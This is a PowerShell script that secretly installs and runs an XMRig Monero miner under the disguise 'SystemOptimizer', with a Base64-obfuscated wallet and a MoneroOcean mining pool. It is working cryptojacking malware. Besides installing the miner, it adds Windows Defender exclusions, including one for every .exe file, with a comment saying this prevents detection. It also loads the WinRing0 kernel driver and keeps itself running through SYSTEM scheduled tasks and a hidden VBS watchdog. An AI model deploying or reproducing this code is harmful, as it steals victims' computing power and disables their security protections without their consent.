#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

$baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
$xmrigDir = "$baseDir"
$xmrigExe = "$xmrigDir\SystemOptimizer.exe"
$configFile = "$baseDir\config.json"
$driverPath = "$xmrigDir\WinRing0x64.sys"
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
$zipPath = "$baseDir\xmrig.zip"

# Obfuscated wallet (Base64 encoded)
$walletB64 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
$wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($walletB64))

# Create directories
New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
New-Item -ItemType Directory -Force -Path $xmrigDir | Out-Null

# Download XMRig if not present
if (-not (Test-Path $xmrigExe)) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath "$baseDir\_tmp" -Force
        Move-Item "$baseDir\_tmp\xmrig-6.26.0\xmrig.exe" $xmrigExe -Force
        Move-Item "$baseDir\_tmp\xmrig-6.26.0\WinRing0x64.sys" $driverPath -Force
        Remove-Item "$baseDir\_tmp" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Write config with decoded wallet
$config = @{
    autosave = $true
    background = $true
    colors = $false
    "donate-level" = 1
    "log-file" = "$baseDir\optimizer.log"
    "print-time" = 30
    retries = 999999
    "retry-pause" = 10
    cpu = @{
        enabled = $true
        "huge-pages" = $true
        "huge-pages-jit" = $true
        "hw-aes" = $true
        priority = 3
        yield = $false
        asm = $true
        "argon2-impl" = "auto"
        "max-threads-hint" = 100
    }
    pools = @(
        @{
            url = "gulf.moneroocean.stream:10002"
            user = $wallet
            pass = "x"
            keepalive = $true
            tls = $true
            "tls-fingerprint" = "auto"
            nicehash = $false
            "rig-id" = $env:COMPUTERNAME
        }
    )
    api = @{
        enabled = $true
        host = "127.0.0.1"
        port = 3456
        restricted = $true
    }
} | ConvertTo-Json -Depth 5
$config | Out-File -FilePath $configFile -Encoding ascii

# Add Windows Defender exclusion for our directory (prevents detection)
try {
    Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
} catch { }

# Install WinRing0 driver
if (Test-Path $driverPath) {
    $svc = "WinRing0_1_2_0"
    $es = Get-Service $svc -ErrorAction SilentlyContinue
    if ($es) { Stop-Service $svc -Force -ErrorAction SilentlyContinue; sc.exe delete $svc 2>$null }
    sc.exe create $svc binPath= "$driverPath" type= kernel start= demand 2>$null
    Start-Service $svc -ErrorAction SilentlyContinue
}

# Create scheduled task using schtasks (more reliable)
$taskName = "SystemOptimizer"
$taskCmd = "schtasks /Create /TN `"$taskName`" /TR `"wscript.exe `"$baseDir\watchdog.vbs`"`" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /RL HIGHEST"
cmd /c $taskCmd 2>$null
$taskCmd2 = "schtasks /Create /TN `"$taskName-Logon`" /TR `"wscript.exe `"$baseDir\watchdog.vbs`"`" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F"
cmd /c $taskCmd2 2>$null
# Enable auto-restart on failure
schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K /F 2>$null

# Create watchdog.vbs (persistent, restarts miner if dead) - write directly
$watchdogPath = "$baseDir\watchdog.vbs"
@'
Set WshShell = CreateObject("WScript.Shell")
Set WMI = GetObject("winmgmts:")
Do
    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'xmrig.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
    If procs.Count = 0 Then
        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { $xmrigExe = '%XMRIG_EXE%'; $configFile = '%CONFIG_FILE%'; $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('"' + $xmrigExe + '" --config="'" + $configFile + "'"', 0, $false) }""", 0, False
    End If
    WScript.Sleep 30000
Loop
'@ -replace '%XMRIG_EXE%', $xmrigExe -replace '%CONFIG_FILE%', $configFile | Out-File -FilePath $watchdogPath -Encoding ascii

# Create launch.vbs (for manual start)
$launchPath = "$baseDir\launch.vbs"
@'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { $xmrigExe = '%XMRIG_EXE%'; $configFile = '%CONFIG_FILE%'; $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('"' + $xmrigExe + '" --config="'" + $configFile + "'"', 0, $false) }""", 0, False
'@ -replace '%XMRIG_EXE%', $xmrigExe -replace '%CONFIG_FILE%', $configFile | Out-File -FilePath $launchPath -Encoding ascii

# Start watchdog now (hidden)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run('wscript.exe "' + $watchdogPath + '"', 0, $false)